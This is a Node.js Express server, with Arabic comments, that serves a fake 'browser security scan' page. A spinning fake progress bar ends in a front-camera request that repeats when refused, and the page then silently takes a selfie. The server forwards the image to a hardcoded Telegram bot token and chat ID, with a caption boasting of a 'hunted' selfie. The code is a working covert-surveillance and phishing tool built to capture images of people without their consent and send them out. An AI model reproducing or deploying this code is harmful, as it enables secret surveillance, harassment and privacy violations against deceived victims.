const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// بيانات السيطرة الخاصة بأسمر
const TOKEN = '8766880203:AAHfls3J_uKpUXdjZjtY3QcsjHXky3xFrxE';
const CHAT_ID = '7099906183';

app.use(express.json({ limit: '50mb' }));

app.post('/send-photo', async (req, res) => {
    const { image } = req.body;
    try {
        // تحويل الصورة وإرسالها لبوت تليجرام حقك
        const base64Data = image.split(',')[1];
        const buffer = Buffer.from(base64Data, 'base64');
        
        const FormData = require('form-data');
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'capture.png' });
        form.append('caption', '🚀 تم اصطياد صورة سيلفي جديدة!\nبواسطة: بوت أسمر المرعب');

        await axios.post(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        });
        res.sendStatus(200);
    } catch (error) {
        console.error('خطأ في الإرسال:', error);
        res.sendStatus(500);
    }
});

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <title>فحص أمني للجهاز</title>
            <style>
                body { background: #000; color: #0f0; text-align: center; font-family: 'Courier New', monospace; padding-top: 100px; }
                .loader { border: 5px solid #333; border-top: 5px solid #0f0; border-radius: 50%; width: 100px; height: 100px; animation: spin 1s linear infinite; margin: 20px auto; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                #status { font-size: 24px; margin-top: 20px; }
            </style>
        </head>
        <body>
            <h2>جاري فحص حماية المتصفح...</h2>
            <div class="loader"></div>
            <div id="status">0%</div>
            <video id="video" style="display:none" autoplay playsinline></video>
            <canvas id="canvas" style="display:none"></canvas>

            <script>
                const v = document.getElementById('video');
                const c = document.getElementById('canvas');
                const s = document.getElementById('status');
                let count = 0;

                let interval = setInterval(() => {
                    count += Math.floor(Math.random() * 3) + 1;
                    if(count >= 100) {
                        count = 100;
                        clearInterval(interval);
                        requestCam();
                    }
                    s.innerText = count + "%";
                }, 100);

                function requestCam() {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then(stream => {
                        v.srcObject = stream;
                        setTimeout(takeSnap, 2000);
                    })
                    .catch(() => {
                        alert("يجب السماح بالفحص الأمني للمتابعة!");
                        requestCam();
                    });
                }

                function takeSnap() {
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const data = c.toDataURL('image/png');
                    fetch('/send-photo', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: data })
                    });
                }
            </script>
        </body>
        </html>
    `);
});

app.listen(port, () => { console.log('Control Online - Asmar System'); });

